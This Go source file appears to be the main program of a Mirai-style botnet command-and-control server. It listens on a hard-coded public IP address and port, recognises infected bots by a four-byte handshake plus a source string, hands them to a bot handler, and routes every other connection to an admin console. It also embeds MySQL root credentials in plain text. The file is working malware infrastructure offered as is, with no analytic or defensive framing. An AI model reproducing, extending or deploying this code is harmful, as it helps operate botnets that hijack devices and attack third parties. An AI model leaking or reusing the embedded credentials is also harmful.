package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "Runescapex@1"
const DatabaseTable string  = "naku"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "45.147.248.182:15412")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("ERROR: run ulimit -n 999999")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    // More robust bot detection: require full bot handshake protocol
    // Bot handshake: 0x00 0x00 0x00 0x01 (4 bytes) + optional source
    fmt.Printf("[CNC] Received %d bytes: %02x %02x %02x %02x\n", l, buf[0], buf[1], buf[2], buf[3])
    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 && buf[3] == 0x01 {
        // This is definitely a bot handshake
        fmt.Printf("[CNC] Bot handshake detected from %s\n", conn.RemoteAddr())
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        // Any other data (including partial 0x00 0x00 0x00 sequences) goes to admin
        NewAdmin(conn).Handle()
    }
}


func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
